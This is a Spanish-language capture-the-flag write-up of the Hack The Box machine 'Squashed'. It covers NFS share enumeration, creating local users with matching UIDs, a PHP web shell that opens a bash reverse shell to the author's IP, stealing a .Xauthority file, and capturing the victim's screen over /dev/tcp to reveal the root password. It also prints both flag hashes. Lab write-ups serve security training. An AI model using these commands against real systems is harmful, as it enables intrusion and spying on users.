---
layout: post
title: Squashed
date: 2023-05-31
description:
img:
fig-caption:
tags: [OSCP]
---
___

<center><img src="/writeups/assets/img/Squashed-htb/Squashed.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración del NFS

* Creación de Usuarios para coincidir con el UID del recurso compartido

* Creación de WebShell

* Abuso del fichero .Xauthority

* Captura de pantalla remota

***

# Reconocimiento

## Escaneo de puertos con nmap

### Puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -vvv 10.10.11.191
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 14:32 GMT
Initiating Connect Scan at 14:32
Scanning 10.10.11.191 [65535 ports]
Discovered open port 80/tcp on 10.10.11.191
Discovered open port 22/tcp on 10.10.11.191
Discovered open port 111/tcp on 10.10.11.191
Discovered open port 44029/tcp on 10.10.11.191
Discovered open port 2049/tcp on 10.10.11.191
Discovered open port 33653/tcp on 10.10.11.191
Discovered open port 41873/tcp on 10.10.11.191
Discovered open port 50773/tcp on 10.10.11.191
Completed Connect Scan at 14:33, 17.38s elapsed (65535 total ports)
Nmap scan report for 10.10.11.191
Host is up, received user-set (0.081s latency).
Scanned at 2023-01-12 14:32:53 GMT for 18s
Not shown: 39368 closed tcp ports (conn-refused), 26159 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
111/tcp   open  rpcbind syn-ack
2049/tcp  open  nfs     syn-ack
33653/tcp open  unknown syn-ack
41873/tcp open  unknown syn-ack
44029/tcp open  unknown syn-ack
50773/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.43 seconds
```

```null
nmap -sCV -p22,80,111,2049,33653,41873,44029,50773 10.10.11.191
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 14:34 GMT
Nmap scan report for 10.10.11.191
Host is up (0.10s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35935/udp6  mountd
|   100005  1,2,3      37455/tcp6  mountd
|   100005  1,2,3      38448/udp   mountd
|   100005  1,2,3      50773/tcp   mountd
|   100021  1,3,4      33653/tcp   nlockmgr
|   100021  1,3,4      40607/tcp6  nlockmgr
|   100021  1,3,4      46533/udp6  nlockmgr
|   100021  1,3,4      59628/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
33653/tcp open  nlockmgr 1-4 (RPC #100021)
41873/tcp open  mountd   1-3 (RPC #100005)
44029/tcp open  mountd   1-3 (RPC #100005)
50773/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.27 seconds
```

### Puerto 80 (http)

```null
whatweb http://10.10.11.191
http://10.10.11.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.191], JQuery[3.0.0], Script, Title[Built Better], X-UA-Compatible[IE=edge]
```

Vista de la web

<img src="/writeups/assets/img/Squashed-htb/1.png" alt="">

Todo es estático, no hay nada que enumerar

### Puerto 2049 (NFS)

Para ver recursos compartidos a través de este servicio, se puede utilizar lo siguiente:

```null
showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```
Como existen recursos compartidos, creo dos monturas para ver el contenido

```null
mkdir /mnt/ross
mkdir /mnt/web_server
mount -t nfs 10.10.11.191:/home/ross /mnt/ross
mount -t nfs 10.10.11.191:/var/www/html /mnt/web_server
```

Visualizando las monturas, se puede ver el UID del propietario

```null
ls -la
drwxr-xr-x root root     4.0 KB Thu Jan 12 14:45:50 2023  .
drwxr-xr-x root root     4.0 KB Sat Dec 24 17:16:18 2022  ..
drwxr-xr-x 1001 1001     4.0 KB Thu Jan 12 06:21:33 2023  ross
drwxr-xr-- 2017 www-data 4.0 KB Thu Jan 12 14:45:01 2023  web_server
```

Se puede crear un usuario con ese identificador para poder tener todos los privilegios

```null
useradd ross -u 2017
groupmod -g 2017 ross
su ross
bash
```

# Explotación

Como hay capacidad de escritura, es posible crear un archivo que envíe una reverse shell a mi equipo

```null
<?php
        system("bash -c 'bash -i >& /dev/tcp/10.10.16.47/443 0>&1'");
?>
```

Al efectuar una petición por GET al recurso y estando en escucha por netcat, gano acceso a la máquina

```null
curl http://10.10.11.191/cmd.php
```

Tratamiento de la TTY

```null
alex@squashed:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
alex@squashed:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
export TERM=xterm
stty rows 56 columns 209
```

Se puede visualizar la primera flag

```null
alex@squashed:/home/alex$ cat /home/alex/user.txt 
4dc368d2e94de826c234e0be43b7a259
```

# Escalada

En la montura de ross, se pueden ver ficheros cuyo UID es 1001

```null
ross@kali:/mnt/ross$ find . -ls
    30718      4 drwxr-xr-x  14 1001     1001         4096 Jan 12 06:21 .
    39115      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 ./Music
    39116      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 ./Pictures
     5632      4 -rw-------   1 1001     1001         2475 Dec 27 15:33 ./.xsession-errors.old
    39023      4 drwx------  11 1001     1001         4096 Oct 21 14:57 ./.cache
find: ‘./.cache’: Permission denied
    39113      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 ./Public
    39114      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 ./Documents
    39343      4 -rw-rw-r--   1 1001     1001         1365 Oct 19 12:57 ./Documents/Passwords.kdbx
    39080      4 drwx------  12 1001     1001         4096 Oct 21 14:57 ./.config
find: ‘./.config’: Permission denied
    39101      4 drwx------   3 1001     1001         4096 Oct 21 14:57 ./.local
find: ‘./.local’: Permission denied
    39128      0 lrwxrwxrwx   1 root      root            9 Oct 21 13:07 ./.viminfo -> /dev/null
     5606      4 -rw-------   1 1001     1001         2475 Jan 12 06:21 ./.xsession-errors
    39117      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 ./articulos
    39012      0 lrwxrwxrwx   1 root      root            9 Oct 20 13:24 ./.bash_history -> /dev/null
    39105      4 drwx------   3 1001     1001         4096 Oct 21 14:57 ./.gnupg
find: ‘./.gnupg’: Permission denied
    39207      4 -rw-------   1 1001     1001           57 Jan 12 06:21 ./.Xauthority
    39110      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 ./Desktop
    39111      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 ./Downloads
    39112      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 ./Templates
```

Por tanto, hay que crear otro usuario para poder tener permisos

```null
useradd ross2 -u 1001
```

Entre esos ficheros, destaca Xauthority, ya que en caso de que haya usuarios conectados, es posible capturar la pantalla

Para comprobarlo:

```null
alex@squashed:/home/alex$ w
 15:06:33 up  8:45,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               06:21    8:45m 46.16s  0.06s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

Ross está conectado y su display es :0

Para poder tener acceso al fichero como el usuario Alex, se puede tratar de crear una copia descargado el fichero como ese usuario

```null
ross2@kali:/mnt/ross$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.191 - - [12/Jan/2023 15:15:59] "GET /.Xauthority HTTP/1.1" 200 -

alex@squashed:/home/alex$ wget http://10.10.16.47/.Xauthority
--2023-01-12 15:15:57--  http://10.10.16.47/.Xauthority
Connecting to 10.10.16.47:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 57 [application/octet-stream]
Saving to: '.Xauthority.1'

.Xauthority.1                                        100%[===================================================================================================================>]      57  --.-KB/s    in 0.1s    

```

Para verificar la conexión:

```null
xdpyinfo -display :0
```

Por tanto, se puede tomar una captura de pantalla

En el directorio de Ross se podía ver una base de datos de Keepass, protegida por contraseña

Al ser una versión antigua no se puede utilizar fuerza bruta

```null
keepass2john Passwords.kdbx
! Passwords.kdbx : File version '40000' is currently not supported!
```

Para capturar la pantalla, se puede emplear lo siguiente:

```null
xwd -root -screen -silent -display :0 > screenshot.xwd
```

Descargando la imagen xwd

```null
alex@squashed:/home/alex$ cat < screenshot.xwd > /dev/tcp/screenshot.xwd/443 # Máquina víctima
nc -nlvp 443 > screenshot.xwd # Equipo local
```

Se puede convertir a una imagen png

```null
convert screenshot.xwd screenshot.png
```

Visualizando la imagen, se puede ver una contraseña en texto claro:

<img src="/writeups/assets/img/Squashed-htb/2.png" alt="">

Corresponde a la contraseña de root, así que puedo migrar de usuario y visualizar la flag

```null
alex@squashed:/home/alex$ su root
Password: 
root@squashed:/home/alex# cat /root/root.txt 
e7e77bbfd961f38c1902ded55a703a4c
```
